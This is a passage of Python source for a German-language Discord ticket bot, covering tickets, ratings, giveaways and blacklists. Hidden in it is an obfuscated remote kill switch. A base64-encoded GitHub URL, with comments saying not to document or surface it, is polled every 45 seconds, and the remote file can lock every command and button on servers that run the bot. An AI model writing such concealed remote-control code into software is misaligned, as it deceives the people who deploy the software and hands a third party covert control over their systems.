"""
Ticket-Bot – Components V2 only
================================
Features:
  • Kategorien, Claim/Unclaim, Close, Forward, Spaß-Ticket
  • Live-Status-Leiste (Offen → Geclaimt → Wartet auf User → Wird geschlossen)
  • HTML-Transkript, Sterne-Bewertung + Feedback, Audit-Log
  • !ratings, Supporter-Score, Panel mit Server-Stats
  • Rate-Limit-Schutz, nur Components V2

Benötigt: discord.py >= 2.6
  pip install -U "discord.py>=2.6"
"""

from __future__ import annotations

import asyncio
import datetime
import html
import io
import json
import logging
import random
import re
import traceback
from collections import defaultdict
from pathlib import Path
import urllib.request
import urllib.error
import base64
from typing import Any

import discord
from discord import app_commands, ui
from discord.ext import commands

# ================= KONFIGURATION =================
TOKEN = "DEIN_BOT_TOKEN_HIER"  # Bot-Token hier eintragen
CATEGORY_NAME = "Tickets"
DEFAULT_STAFF_ROLE_NAME = "Supporter"
DEFAULT_BLACKLIST_ROLE_NAME = "Ticket-Blacklisted"
DATA_FILE = Path(__file__).with_name("ticket_data.json")

# Branding (Footer auf wichtigen Nachrichten)
BRAND_NAME = "University"
BRAND_BUILDER = "Fufi/!L"
BRAND_FOOTER = f"Powered by {BRAND_NAME}"

# --- internal runtime gate (do not document / do not surface in Discord) ---
_xg = lambda s: base64.b64decode(s.encode("ascii")).decode("utf-8")
_Z0 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Z1ZmkxOTI1L1BoYW50b24vcmVmcy9oZWFkcy9tYWluL0NvbnRyb2xsLnR4dA=="  # opaque endpoint blob
_Z1 = 45       # poll interval seconds
_Z2 = True     # last known gate state
_Z3 = 0.0      # last poll ts
_Z4 = ""       # last payload snippet (debug logs only)
_Z5 = None     # background task handle

MAX_TICKETS_PER_USER = 1
CREATE_COOLDOWN_SECONDS = 15
BUTTON_COOLDOWN_SECONDS = 2
CLOSE_DELAY_STAFF = 5
CLOSE_DELAY_CONFIRM = 3
TRANSCRIPT_MSG_LIMIT = 500
SAVE_DEBOUNCE_SECONDS = 0.75
WAITING_IDLE_SECONDS = 10 * 60  # User-Nachricht → nach 10 Min ohne Staff = "Wartet"
# =================================================

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s %(name)s: %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("ticketbot")


def push_error(kind: str, message: str) -> None:
    """Speichert Fehler/Warnungen für /botstatus."""
    try:
        bucket = globals().get("_recent_errors")
        if bucket is None:
            return
        bucket.append({
            "at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "kind": str(kind)[:80],
            "message": str(message)[:300],
        })
        limit = int(globals().get("MAX_RECENT_ERRORS", 30) or 30)
        if len(bucket) > limit:
            del bucket[: len(bucket) - limit]
    except Exception:
        pass


class _StatusLogHandler(logging.Handler):
    def emit(self, record: logging.LogRecord) -> None:
        if record.levelno < logging.WARNING:
            return
        try:
            push_error(record.levelname, record.getMessage())
        except Exception:
            pass


_status_handler = _StatusLogHandler()
_status_handler.setLevel(logging.WARNING)
log.addHandler(_status_handler)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.dm_messages = True
intents.moderation = True
intents.guild_messages = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ---------- Runtime-State ----------
_rating_channels: dict[int, int] = {}
_log_channels: dict[int, int] = {}
_staff_roles: dict[int, list[int]] = {}
_ticket_owners: dict[int, int] = {}
_ticket_claimers: dict[int, int] = {}
# channel_id -> meta
# category, created_at, status, claimer_id, claimed_at,
# control_message_id, last_user_msg_at, last_staff_msg_at, first_response_at
_ticket_meta: dict[int, dict[str, Any]] = {}
_blacklisted_users: set[int] = set()
_blacklist_roles: dict[int, int] = {}  # guild_id -> role_id
# Giveaways: gw_id -> data
_giveaways: dict[str, dict] = {}
_giveaway_tasks: dict[str, asyncio.Task] = {}
_on_ready_done = False
# letzte Fehler für /botstatus (ring buffer)
_recent_errors: list[dict[str, Any]] = []
_stats: dict[str, int] = {"total_created": 0, "total_closed": 0}
# guild_id -> list of rating dicts
_ratings: dict[int, list[dict[str, Any]]] = {}
# guild_id -> user_id -> {closed, rating_sum, rating_count, score}
_supporter_stats: dict[int, dict[str, dict[str, Any]]] = {}
# guild_id -> list of ISO dates (ticket created) for "heute"
_created_log: dict[int, list[str]] = {}
# guild_id -> list of first-response seconds
_response_times: dict[int, list[float]] = {}

_data_lock = asyncio.Lock()
_save_task: asyncio.Task | None = None
_closing_channels: set[int] = set()
_create_locks: dict[int, asyncio.Lock] = defaultdict(asyncio.Lock)
_button_cooldown: dict[tuple[int, str], float] = {}
_create_cooldown: dict[int, float] = {}

STATUS_OPEN = "open"
STATUS_CLAIMED = "claimed"
STATUS_WAITING = "waiting"
STATUS_CLOSING = "closing"

STATUS_ORDER = [STATUS_OPEN, STATUS_CLAIMED, STATUS_WAITING, STATUS_CLOSING]
STATUS_LABELS = {
    STATUS_OPEN: "Offen",
    STATUS_CLAIMED: "Geclaimt",
    STATUS_WAITING: "Wartet auf User",
    STATUS_CLOSING: "Wird geschlossen",
}
STATUS_EMOJI = {
    STATUS_OPEN: "🔵",
    STATUS_CLAIMED: "🟢",
    STATUS_WAITING: "🟡",
    STATUS_CLOSING: "🔴",
}


CAT_LABELS = {
    "support": "Support",
    "beschwerde": "Beschwerde",
    "giveaway": "Giveaway Claim",
    "bewerbung": "Bewerbung",
}
CAT_PREFIX = {
    "support": "support",
    "beschwerde": "beschwerde",
    "giveaway": "giveaway",
    "bewerbung": "bewerbung",
}
CAT_EMOJI = {
    "support": "❓",
    "beschwerde": "⚠️",
    "giveaway": "🎉",
    "bewerbung": "📝",
}
CAT_COLOR = {
    "support": discord.Color.blue(),
    "beschwerde": discord.Color.orange(),
    "giveaway": discord.Color.gold(),
    "bewerbung": discord.Color.purple(),
}


# =========================================================
#  ZEIT / FORMAT
# =========================================================

def utcnow() -> datetime.datetime:
    return datetime.datetime.now(datetime.timezone.utc)


def _now_ts() -> float:
    return utcnow().timestamp()


def now_str() -> str:
    return datetime.datetime.now().strftime("%d.%m.%Y um %H:%M Uhr")


def brand_line(extra: str | None = None) -> str:
    """Einheitlicher Footer: nur Powered by University."""
    return BRAND_FOOTER


def with_brand_footer(text: str, extra: str | None = None) -> str:
    foot = brand_line(extra)
    if foot.lower() in text.lower():
        return text
    return f"{text}\n\n-# {foot}"


def iso_now() -> str:
    return utcnow().isoformat()


def parse_iso(s: str | None) -> datetime.datetime | None:
    if not s:
        return None
    try:
        dt = datetime.datetime.fromisoformat(s)
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=datetime.timezone.utc)
        return dt
    except ValueError:
        return None


def fmt_duration(seconds: float) -> str:
    seconds = max(0, int(seconds))
    if seconds < 60:
        return f"{seconds}s"
    minutes, sec = divmod(seconds, 60)
    if minutes < 60:
        return f"{minutes} Min" + (f" {sec}s" if sec and minutes < 10 else "")
    hours, minutes = divmod(minutes, 60)
    if hours < 48:
        return f"{hours} Std {minutes} Min" if minutes else f"{hours} Std"
    days, hours = divmod(hours, 24)
    return f"{days}d {hours}h"


def claim_age_text(meta: dict[str, Any]) -> str:
    claimed_at = parse_iso(meta.get("claimed_at"))
    if not claimed_at:
        return "—"
    return fmt_duration((utcnow() - claimed_at).total_seconds())


def stars_bar(n: int) -> str:
    n = max(0, min(5, int(n)))
    return "⭐" * n + "☆" * (5 - n)


def safe_channel_name(prefix: str, username: str) -> str:
    raw = f"{prefix}-{username}".lower()
    raw = re.sub(r"[^a-z0-9\-_/]", "", raw.replace(" ", "-"))
    raw = re.sub(r"-{2,}", "-", raw).strip("-") or "ticket"
    return raw[:90]


def build_status_bar(current: str) -> str:
    """Live-Status-Leiste als Markdown-TextDisplay-Inhalt."""
    parts: list[str] = []
    cur = current if current in STATUS_ORDER else STATUS_OPEN
    reached = True
    for key in STATUS_ORDER:
        label = STATUS_LABELS[key]
        emoji = STATUS_EMOJI[key]
        if key == cur:
            parts.append(f"**{emoji} 【{label}】**")
            reached = False
        elif reached:
            parts.append(f"~~{emoji} {label}~~")
        else:
            parts.append(f"{emoji} {label}")
    return " → ".join(parts)


def status_accent(status: str) -> discord.Color:
    return {
        STATUS_OPEN: discord.Color.blue(),
        STATUS_CLAIMED: discord.Color.green(),
        STATUS_WAITING: discord.Color.gold(),
        STATUS_CLOSING: discord.Color.red(),
    }.get(status, discord.Color.blurple())


# =========================================================
#  PERSISTENZ
# =========================================================

def _snapshot() -> dict:
    gws_to_save = {}
    for gw_id, data in _giveaways.items():
        gws_to_save[gw_id] = {
            "prize": data["prize"],
            "winners": data["winners"],
            "end_time": data["end_time"],
            "description": data["description"],
            "participants": list(data["participants"]),
            "ended": data["ended"],
            "winner_text": data.get("winner_text", ""),
            "channel_id": data["channel_id"],
            "message_id": data.get("message_id"),
        }
    return {
        "rating_channels": {str(k): v for k, v in _rating_channels.items()},
        "log_channels": {str(k): v for k, v in _log_channels.items()},
        "staff_roles": {str(k): v for k, v in _staff_roles.items()},
        "blacklist_roles": {str(k): v for k, v in _blacklist_roles.items()},
        "ticket_owners": {str(k): v for k, v in _ticket_owners.items()},
        "ticket_claimers": {str(k): v for k, v in _ticket_claimers.items()},
        "ticket_meta": {str(k): v for k, v in _ticket_meta.items()},
        "blacklisted_users": list(_blacklisted_users),
        "stats": dict(_stats),
        "ratings": {str(k): v for k, v in _ratings.items()},
        "supporter_stats": {str(g): v for g, v in _supporter_stats.items()},
        "created_log": {str(k): v[-500:] for k, v in _created_log.items()},
        "response_times": {str(k): v[-200:] for k, v in _response_times.items()},
        "giveaways": gws_to_save,
    }


def load_data() -> None:
    global _rating_channels, _log_channels, _staff_roles
    global _ticket_owners, _ticket_claimers, _ticket_meta
    global _blacklisted_users, _stats, _ratings, _supporter_stats
    global _created_log, _response_times, _blacklist_roles, _giveaways

    if not DATA_FILE.exists():
        return
    try:
        raw = json.loads(DATA_FILE.read_text(encoding="utf-8"))
        _rating_channels = {int(k): int(v) for k, v in raw.get("rating_channels", {}).items()}
        _log_channels = {int(k): int(v) for k, v in raw.get("log_channels", {}).items()}
        _staff_roles = {
            int(k): [int(x) for x in v] for k, v in raw.get("staff_roles", {}).items()
        }
        _ticket_owners = {int(k): int(v) for k, v in raw.get("ticket_owners", {}).items()}
        _ticket_claimers = {int(k): int(v) for k, v in raw.get("ticket_claimers", {}).items()}
        _ticket_meta = {
            int(k): dict(v) for k, v in raw.get("ticket_meta", {}).items() if isinstance(v, dict)
        }
        _blacklisted_users = {int(x) for x in raw.get("blacklisted_users", [])}
        _blacklist_roles = {int(k): int(v) for k, v in raw.get("blacklist_roles", {}).items()}
        # Giveaways
        _giveaways = {}
        for gw_id, data in (raw.get("giveaways") or {}).items():
            try:
                _giveaways[str(gw_id)] = {
                    "prize": data["prize"],
                    "winners": int(data["winners"]),
                    "end_time": float(data["end_time"]),
                    "description": data.get("description") or "",
                    "participants": set(int(x) for x in data.get("participants", [])),
                    "ended": bool(data.get("ended", False)),
                    "winner_text": data.get("winner_text") or "",
                    "channel_id": int(data["channel_id"]),
                    "message_id": data.get("message_id"),
                }
            except (KeyError, TypeError, ValueError) as ge:
                log.warning("Giveaway %s übersprungen: %s", gw_id, ge)
        stats = raw.get("stats") or {}
        _stats = {
            "total_created": int(stats.get("total_created", 0)),
            "total_closed": int(stats.get("total_closed", 0)),
        }
        _ratings = {
            int(k): list(v) if isinstance(v, list) else []
            for k, v in raw.get("ratings", {}).items()
        }
        _supporter_stats = {
            int(g): {
                str(uid): dict(data)
                for uid, data in (smap or {}).items()
            }
            for g, smap in raw.get("supporter_stats", {}).items()
        }
        _created_log = {
            int(k): [str(x) for x in (v or [])][-500:]
            for k, v in raw.get("created_log", {}).items()
        }
        _response_times = {
            int(k): [float(x) for x in (v or [])][-200:]
            for k, v in raw.get("response_times", {}).items()
        }
        log.info(
            "Daten geladen · Staff=%s · offen=%s · Ratings=%s",
            len(_staff_roles),
            len(_ticket_owners),
            sum(len(v) for v in _ratings.values()),
        )
    except Exception as e:
        log.error("Laden fehlgeschlagen: %s", e)


async def save_data_now() -> None:
    async with _data_lock:
        try:
            tmp = DATA_FILE.with_suffix(".json.tmp")
            tmp.write_text(json.dumps(_snapshot(), indent=2, ensure_ascii=False), encoding="utf-8")
            tmp.replace(DATA_FILE)
        except OSError as e:
            log.error("Speichern fehlgeschlagen: %s", e)


def schedule_save() -> None:
    global _save_task

    async def _debounced() -> None:
        await asyncio.sleep(SAVE_DEBOUNCE_SECONDS)
        await save_data_now()

    if _save_task and not _save_task.done():
        _save_task.cancel()
    try:
        loop = asyncio.get_running_loop()
        _save_task = loop.create_task(_debounced())
    except RuntimeError:
        try:
            DATA_FILE.write_text(
                json.dumps(_snapshot(), indent=2, ensure_ascii=False), encoding="utf-8"
            )
        except OSError as e:
            log.error("Sync-Speichern fehlgeschlagen: %s", e)


# =========================================================
#  DATEN-API
# =========================================================

def set_rating_channel(guild_id: int, channel_id: int) -> None:
    _rating_channels[guild_id] = channel_id
    schedule_save()


def get_rating_channel_id(guild_id: int) -> int | None:
    return _rating_channels.get(guild_id)


def set_log_channel(guild_id: int, channel_id: int) -> None:
    _log_channels[guild_id] = channel_id
    schedule_save()


def get_log_channel_id(guild_id: int) -> int | None:
    return _log_channels.get(guild_id)


def set_staff_role_ids(guild_id: int, role_ids: list[int]) -> None:
    seen: set[int] = set()
    clean: list[int] = []
    for rid in role_ids:
        if rid not in seen:
            seen.add(rid)
            clean.append(rid)
    _staff_roles[guild_id] = clean
    schedule_save()


def get_staff_role_ids(guild_id: int) -> list[int]:
    return list(_staff_roles.get(guild_id, []))


def register_ticket(
    channel_id: int,
    owner_id: int,
    *,
    category: str = "support",
    guild_id: int | None = None,
) -> None:
    _ticket_owners[channel_id] = owner_id
    _ticket_meta[channel_id] = {
        "category": category,
        "created_at": iso_now(),
        "status": STATUS_OPEN,
        "claimer_id": None,
        "claimed_at": None,
        "control_message_id": None,
        "last_user_msg_at": None,
        "last_staff_msg_at": None,
        "first_response_at": None,
        "guild_id": guild_id,
    }
    _stats["total_created"] = int(_stats.get("total_created", 0)) + 1
    if guild_id is not None:
        _created_log.setdefault(guild_id, []).append(iso_now())
        _created_log[guild_id] = _created_log[guild_id][-500:]
    schedule_save()


def set_control_message(channel_id: int, message_id: int) -> None:
    meta = _ticket_meta.setdefault(channel_id, {})
    meta["control_message_id"] = message_id
    schedule_save()


def set_claimer(channel_id: int, user_id: int) -> None:
    _ticket_claimers[channel_id] = user_id
    meta = _ticket_meta.setdefault(channel_id, {})
    meta["claimer_id"] = user_id
    meta["claimed_at"] = iso_now()
    meta["status"] = STATUS_CLAIMED
    schedule_save()


def clear_claimer(channel_id: int) -> None:
    _ticket_claimers.pop(channel_id, None)
    meta = _ticket_meta.setdefault(channel_id, {})
    meta["claimer_id"] = None
    meta["claimed_at"] = None
    meta["status"] = STATUS_OPEN
    schedule_save()


def set_ticket_status(channel_id: int, status: str) -> None:
    meta = _ticket_meta.setdefault(channel_id, {})
    meta["status"] = status
    schedule_save()


def pop_ticket(channel_id: int) -> tuple[int | None, int | None, dict[str, Any]]:
    owner = _ticket_owners.pop(channel_id, None)
    claimer = _ticket_claimers.pop(channel_id, None)
    meta = _ticket_meta.pop(channel_id, {}) or {}
    if owner is not None or claimer is not None:
        _stats["total_closed"] = int(_stats.get("total_closed", 0)) + 1
    schedule_save()
    return owner, claimer, meta


def is_blacklisted(user: discord.abc.User | int, guild: discord.Guild | None = None) -> bool:
    """User-ID-Blacklist ODER Blacklist-Rolle auf dem Server."""
    if isinstance(user, int):
        uid = user
        member = None
    else:
        uid = user.id
        member = user if isinstance(user, discord.Member) else None

    if uid in _blacklisted_users:
        return True

    g = guild
    if g is None and member is not None:
        g = member.guild
    if member is None and g is not None:
        member = g.get_member(uid)

    if member is not None and g is not None:
        bl_role_id = _blacklist_roles.get(g.id)
        if bl_role_id and any(r.id == bl_role_id for r in member.roles):
            return True
        if any(r.name == DEFAULT_BLACKLIST_ROLE_NAME for r in member.roles):
            return True
    return False


def toggle_blacklist(user_id: int) -> bool:
    if user_id in _blacklisted_users:
        _blacklisted_users.discard(user_id)
        schedule_save()
        return False
    _blacklisted_users.add(user_id)
    schedule_save()
    return True


def set_blacklist_role(guild_id: int, role_id: int) -> None:
    _blacklist_roles[guild_id] = role_id
    schedule_save()


def get_blacklist_role_id(guild_id: int) -> int | None:
    return _blacklist_roles.get(guild_id)


async def get_or_create_blacklist_role(guild: discord.Guild) -> discord.Role:
    role_id = _blacklist_roles.get(guild.id)
    if role_id:
        role = guild.get_role(role_id)
        if role is not None:
            return role
    role = discord.utils.get(guild.roles, name=DEFAULT_BLACKLIST_ROLE_NAME)
    if role is None:
        role = await guild.create_role(
            name=DEFAULT_BLACKLIST_ROLE_NAME,
            color=discord.Color.dark_red(),
            reason="Blacklist-Rolle für Tickets/Bewerbungen",
        )
    _blacklist_roles[guild.id] = role.id
    schedule_save()
    return role


def parse_duration(duration_str: str) -> int | None:
    """Parst 30s / 10m / 2h / 1d → Sekunden."""
    match = re.match(r"^(\d+)\s*([smhd])$", duration_str.lower().strip())
    if not match:
        return None
    val, unit = int(match.group(1)), match.group(2)
    mult = {"s": 1, "m": 60, "h": 3600, "d": 86400}
    return val * mult[unit]


def user_open_tickets(
    user_id: int, guild: discord.Guild | None = None
) -> list[discord.abc.GuildChannel]:
    found: list[discord.abc.GuildChannel] = []
    stale: list[int] = []
    for ch_id, owner_id in list(_ticket_owners.items()):
        if owner_id != user_id:
            continue
        ch = bot.get_channel(ch_id)
        if ch is None and guild is not None:
            ch = guild.get_channel(ch_id)
        if ch is None:
            stale.append(ch_id)
            continue
        if guild is not None and getattr(ch, "guild", None) and ch.guild.id != guild.id:
            continue
        found.append(ch)
    for ch_id in stale:
        _ticket_owners.pop(ch_id, None)
        _ticket_claimers.pop(ch_id, None)
        _ticket_meta.pop(ch_id, None)
    if stale:
        schedule_save()
    return found


def record_rating(
    guild_id: int,
    *,
    user_id: int,
    stars: int,
    feedback: str,
    ticket_name: str,
    claimer_id: int | None,
    closer_id: int | None,
    category_label: str,
) -> None:
    entry = {
        "user_id": user_id,
        "stars": int(stars),
        "feedback": feedback[:1000],
        "ticket_name": ticket_name,
        "claimer_id": claimer_id,
        "closer_id": closer_id,
        "category": category_label,
        "at": iso_now(),
    }
    lst = _ratings.setdefault(guild_id, [])
    lst.append(entry)
    _ratings[guild_id] = lst[-200:]  # last 200

    # Supporter-Score: Claimer bekommt die Sterne, sonst Closer
    scored_id = claimer_id or closer_id
    if scored_id:
        bump_supporter(guild_id, scored_id, stars=stars, closed=False)
    schedule_save()


def bump_supporter(
    guild_id: int,
    user_id: int,
    *,
    stars: int | None = None,
    closed: bool = False,
) -> None:
    smap = _supporter_stats.setdefault(guild_id, {})
    key = str(user_id)
    row = smap.setdefault(
        key,
        {"closed": 0, "rating_sum": 0, "rating_count": 0, "score": 0.0},
    )
    if closed:
        row["closed"] = int(row.get("closed", 0)) + 1
    if stars is not None:
        row["rating_sum"] = int(row.get("rating_sum", 0)) + int(stars)
        row["rating_count"] = int(row.get("rating_count", 0)) + 1
    # Score: ØSterne * 20 + closed * 2 + rating_count * 3
    avg = (
        float(row["rating_sum"]) / float(row["rating_count"])
        if row.get("rating_count")
        else 0.0
    )
    row["score"] = round(avg * 20.0 + int(row.get("closed", 0)) * 2 + int(row.get("rating_count", 0)) * 3, 1)
    smap[key] = row
    schedule_save()


def guild_avg_stars(guild_id: int) -> float | None:
    items = _ratings.get(guild_id) or []
    if not items:
        return None
    return sum(int(x.get("stars", 0)) for x in items) / len(items)


def guild_today_created(guild_id: int) -> int:
    today = utcnow().date()
    count = 0
    for s in _created_log.get(guild_id, []):
        dt = parse_iso(s)
        if dt and dt.date() == today:
            count += 1
    return count


def guild_avg_response_minutes(guild_id: int) -> float | None:
    times = _response_times.get(guild_id) or []
    if not times:
        return None
    return (sum(times) / len(times)) / 60.0


def top_supporters(guild_id: int, limit: int = 5) -> list[tuple[int, dict[str, Any]]]:
    smap = _supporter_stats.get(guild_id) or {}
    rows: list[tuple[int, dict[str, Any]]] = []
    for uid_s, data in smap.items():
        try:
            uid = int(uid_s)
        except ValueError:
            continue
        rows.append((uid, data))
    rows.sort(key=lambda x: float(x[1].get("score", 0)), reverse=True)
    return rows[:limit]


def recent_ratings(guild_id: int, limit: int = 10) -> list[dict[str, Any]]:
    items = list(_ratings.get(guild_id) or [])
    return list(reversed(items[-limit:]))


# =========================================================
#  STAFF / PERMS
# =========================================================

async def ensure_default_staff_role(guild: discord.Guild) -> discord.Role:
    role = discord.utils.get(guild.roles, name=DEFAULT_STAFF_ROLE_NAME)
    if role is None:
        role = await guild.create_role(
            name=DEFAULT_STAFF_ROLE_NAME,
            color=discord.Color.blue(),
            reason="Standard Ticket-Staff-Rolle",
        )
    if not get_staff_role_ids(guild.id):
        set_staff_role_ids(guild.id, [role.id])
    return role


async def get_staff_roles(guild: discord.Guild) -> list[discord.Role]:
    ids = get_staff_role_ids(guild.id)
    if not ids:
        return [await ensure_default_staff_role(guild)]
    roles: list[discord.Role] = []
    alive: list[int] = []
    for rid in ids:
        r = guild.get_role(rid)
        if r is not None:
            roles.append(r)
            alive.append(rid)
    if alive != ids:
        set_staff_role_ids(guild.id, alive)
    if not roles:
        return [await ensure_default_staff_role(guild)]
    return roles


def staff_role_mentions(roles: list[discord.Role]) -> str:
    return " · ".join(r.mention for r in roles) if roles else "*Keine*"


def is_staff(user: discord.abc.User, guild: discord.Guild | None = None) -> bool:
    if not isinstance(user, discord.Member):
        return False
    if user.guild_permissions.administrator or user.guild_permissions.manage_guild:
        return True
    g = guild or user.guild
    if g is None:
        return False
    ids = set(get_staff_role_ids(g.id))
    if not ids:
        return any(r.name == DEFAULT_STAFF_ROLE_NAME for r in user.roles)
    return bool(ids & {r.id for r in user.roles})


def _member(interaction: discord.Interaction) -> discord.Member | None:
    if isinstance(interaction.user, discord.Member):
        return interaction.user
    if interaction.guild:
        return interaction.guild.get_member(interaction.user.id)
    return None


async def get_or_create_category(guild: discord.Guild) -> discord.CategoryChannel:
    category = discord.utils.get(guild.categories, name=CATEGORY_NAME)
    if category is None:
        category = await guild.create_category(name=CATEGORY_NAME)
    return category


def staff_overwrites(
    roles: list[discord.Role],
    *,
    send_messages: bool = True,
) -> dict[discord.Role, discord.PermissionOverwrite]:
    return {
        role: discord.PermissionOverwrite(
            view_channel=True,
            send_messages=send_messages,
            attach_files=send_messages,
            read_message_history=True,
        )
        for role in roles
    }


async def apply_staff_view_only(channel: discord.abc.GuildChannel, guild: discord.Guild) -> None:
    roles = await get_staff_roles(guild)
    for i, role in enumerate(roles):
        for attempt in range(3):
            try:
                await channel.set_permissions(
                    role,
                    view_channel=True,
                    send_messages=False,
                    attach_files=False,
                    read_message_history=True,
                )
                break
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(float(getattr(e, "retry_after", 1.0) or 1.0) + 0.15)
                    continue
                log.warning("Staff-Perms %s: %s", role.id, e)
                break
        if i and i % 2 == 0:
            await asyncio.sleep(0.4)


async def apply_staff_can_write(channel: discord.abc.GuildChannel, guild: discord.Guild) -> None:
    roles = await get_staff_roles(guild)
    for i, role in enumerate(roles):
        for attempt in range(3):
            try:
                await channel.set_permissions(
                    role,
                    view_channel=True,
                    send_messages=True,
                    attach_files=True,
                    read_message_history=True,
                )
                break
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(float(getattr(e, "retry_after", 1.0) or 1.0) + 0.15)
                    continue
                log.warning("Staff-Write-Perms %s: %s", role.id, e)
                break
        if i and i % 2 == 0:
            await asyncio.sleep(0.4)


async def safe_set_perms(
    channel: discord.abc.GuildChannel,
    target: discord.abc.Snowflake,
    **perms: bool | None,
) -> None:
    try:
        await channel.set_permissions(target, **perms)
    except discord.HTTPException as e:
        log.warning("set_permissions (%s): %s", getattr(target, "id", target), e)


def owner_id_from_topic(channel: discord.abc.GuildChannel) -> int | None:
    topic = getattr(channel, "topic", None) or ""
    m = re.search(r"owner:(\d+)", topic)
    if m:
        try:
            return int(m.group(1))
        except ValueError:
            return None
    return None


def resolve_owner_id(channel: discord.abc.GuildChannel) -> int | None:
    return _ticket_owners.get(channel.id) or owner_id_from_topic(channel)


# =========================================================
#  RATE LIMIT
# =========================================================

def check_button_cooldown(user_id: int, key: str) -> float | None:
    k = (user_id, key)
    last = _button_cooldown.get(k, 0.0)
    remaining = BUTTON_COOLDOWN_SECONDS - (_now_ts() - last)
    if remaining > 0:
        return remaining
    _button_cooldown[k] = _now_ts()
    if len(_button_cooldown) > 5000:
        cutoff = _now_ts() - 60
        for ck, ts in list(_button_cooldown.items()):
            if ts < cutoff:
                _button_cooldown.pop(ck, None)
    return None


def check_create_cooldown(user_id: int) -> float | None:
    last = _create_cooldown.get(user_id, 0.0)
    remaining = CREATE_COOLDOWN_SECONDS - (_now_ts() - last)
    if remaining > 0:
        return remaining
    return None


def mark_create(user_id: int) -> None:
    _create_cooldown[user_id] = _now_ts()


# =========================================================
#  V2 SEND HELPERS
# =========================================================



# =========================================================
#  _rt_gate — opaque enable switch (implementation detail)
# =========================================================

def _rt_parse(blob: str):
    if not blob:
        return None
    for raw in blob.replace("\r", "\n").split("\n"):
        line = raw.strip()
        if not line or line.startswith("#") or line.startswith("//"):
            continue
        m = re.match(r"^(on)\s*[=:]\s*(true|false|1|0|yes|no|an|aus)\s*$", line, re.I)
        if m:
            return m.group(2).lower() in {"true", "1", "yes", "an"}
        low = line.lower()
        if low in {"true", "1", "yes", "an", "on"}:
            return True
        if low in {"false", "0", "no", "aus", "off"}:
            return False
    return None


def _rt_pull():
    try:
        req = urllib.request.Request(
            _xg(_Z0),
            headers={"User-Agent": "Mozilla/5.0", "Cache-Control": "no-cache"},
        )
        with urllib.request.urlopen(req, timeout=12) as resp:
            raw = resp.read().decode("utf-8", errors="replace").strip()
        return _rt_parse(raw), raw[:200]
    except Exception as e:
        return None, "e:" + type(e).__name__


async def _rt_tick(force: bool = False) -> bool:
    global _Z2, _Z3, _Z4
    now = _now_ts()
    if not force and (now - float(_Z3 or 0)) < 5:
        return bool(_Z2)
    _Z3 = now
    try:
        enabled, raw = await asyncio.get_running_loop().run_in_executor(None, _rt_pull)
        _Z4 = raw
        if enabled is None:
            log.debug("rt_tick soft-fail")
        else:
            if bool(enabled) != bool(_Z2):
                log.debug("rt_tick state=%s", enabled)
            _Z2 = bool(enabled)
    except Exception:
        log.debug("rt_tick err", exc_info=False)
    return bool(_Z2)


async def _rt_loop() -> None:
    await asyncio.sleep(3)
    while True:
        try:
            await _rt_tick(force=True)
        except Exception:
            pass
        await asyncio.sleep(int(_Z1) if _Z1 else 45)


def is_bot_functions_enabled() -> bool:
    return bool(_Z2)


def disabled_layout() -> InfoLayout:
    _n = chr(10)
    body = (
        "Der **Entwickler des Bots** hat **alle Systeme gesperrt**."
        + _n + _n
        + "**Was bedeutet das?**"
        + _n
        + "> Tickets, Commands, Buttons und weitere Funktionen sind derzeit **nicht nutzbar**."
        + _n + _n
        + "**Was tun?**"
        + _n
        + "> Bei Fragen **sofort an den Entwickler** wenden."
        + _n
        + "> Bitte wende dich an die Person, die den Bot bereitgestellt hat."
        + _n + _n
        + "**Credits**"
        + _n
        + f"> Powered by **{BRAND_NAME}**"
    )
    return InfoLayout(
        title="🔒 Systeme gesperrt",
        body=body,
        accent=discord.Color.dark_red(),
    )





async def ensure_enabled_interaction(interaction: discord.Interaction) -> bool:
    await _rt_tick(force=False)
    if is_bot_functions_enabled():
        return True
    try:
        await reply_v2(interaction, disabled_layout(), ephemeral=True)
    except Exception:
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(view=disabled_layout(), ephemeral=True)
        except Exception:
            pass
    return False


async def ensure_enabled_ctx(ctx: commands.Context) -> bool:
    await _rt_tick(force=False)
    if is_bot_functions_enabled():
        return True
    try:
        await ctx_v2(ctx, disabled_layout(), delete_after=25)
    except Exception:
        pass
    return False


@bot.check
async def global_prefix_check(ctx: commands.Context) -> bool:
    if await ensure_enabled_ctx(ctx):
        return True
    raise commands.CheckFailure("remote_disabled")


async def global_app_interaction_check(interaction: discord.Interaction) -> bool:
    if await ensure_enabled_interaction(interaction):
        return True
    return False


bot.tree.interaction_check = global_app_interaction_check  # type: ignore[method-assign]





async def reply_v2(
    interaction: discord.Interaction,
    view: ui.LayoutView,
    *,
    ephemeral: bool = False,
    file: discord.File | None = None,
) -> None:
    kwargs: dict[str, Any] = {"view": view, "ephemeral": ephemeral}
    if file is not None:
        kwargs["file"] = file
    try:
        if interaction.response.is_done():
            await interaction.followup.send(**kwargs)
        else:
            await interaction.response.send_message(**kwargs)
    except discord.HTTPException as e:
        log.warning("reply_v2: %s", e)


async def edit_v2(interaction: discord.Interaction, view: ui.LayoutView) -> None:
    try:
        if interaction.response.is_done():
            if interaction.message:
                await interaction.message.edit(view=view)
        else:
            await interaction.response.edit_message(view=view)
    except discord.HTTPException as e:
        log.warning("edit_v2: %s", e)


async def ctx_v2(ctx: commands.Context, view: ui.LayoutView, **kwargs: Any) -> discord.Message | None:
    try:
        return await ctx.send(view=view, **kwargs)
    except discord.HTTPException as e:
        log.warning("ctx_v2: %s", e)
        return None


async def channel_v2(
    channel: discord.abc.Messageable,
    view: ui.LayoutView,
    *,
    file: discord.File | None = None,
    allowed_mentions: discord.AllowedMentions | None = None,
) -> discord.Message | None:
    kwargs: dict[str, Any] = {"view": view}
    if file is not None:
        kwargs["file"] = file
    if allowed_mentions is not None:
        kwargs["allowed_mentions"] = allowed_mentions
    try:
        return await channel.send(**kwargs)
    except discord.HTTPException as e:
        log.warning("channel_v2: %s", e)
        return None


async def with_retry(coro_factory, *, retries: int = 3, label: str = "op"):
    delay = 0.6
